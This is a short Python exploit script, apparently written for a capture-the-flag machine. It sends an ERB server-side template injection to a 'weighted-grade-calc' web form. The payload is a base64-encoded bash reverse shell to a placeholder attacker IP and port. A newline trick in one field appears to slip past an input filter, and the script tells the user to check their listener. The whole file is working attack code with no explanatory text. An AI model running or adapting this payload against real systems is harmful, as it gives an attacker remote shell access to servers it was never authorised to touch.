import requests
import base64

url="http://{Target IP address}/weighted-grade-calc"
rev_shell=b'/bin/bash -i >& /dev/tcp/{Attacker IP Address}/{Attacker Port no} 0>&1'

encode_data=base64.b64encode(rev_shell)
remove_byte=encode_data.decode('utf-8')
payload_data={
	"category1":f"test\n<%= system('echo \"{remove_byte}\" | base64 -d | bash -i ') %>",
	"grade1":"46",	
	"weight1":"50",

	"category2":"admin",
	"grade2":"46",	
	"weight2":"20",

	"category3":"hello",
	"grade3":"46",	
	"weight3":"10",

	"category4":"world",
	"grade4":"46",	
	"weight4":"10",

	"category5":"N/A",
	"grade5":"46",	
	"weight5":"10"
}

print("[+] payload get excuted..ğŸ˜ \n[+]..now check your listener")

r=requests.post(url,data=payload_data) 

# This is an additional line of code that, if our payload is detected
if "Malicious input blocked" in r.text:
	print("[-] failed to excuted payload get block ğŸ˜¥")




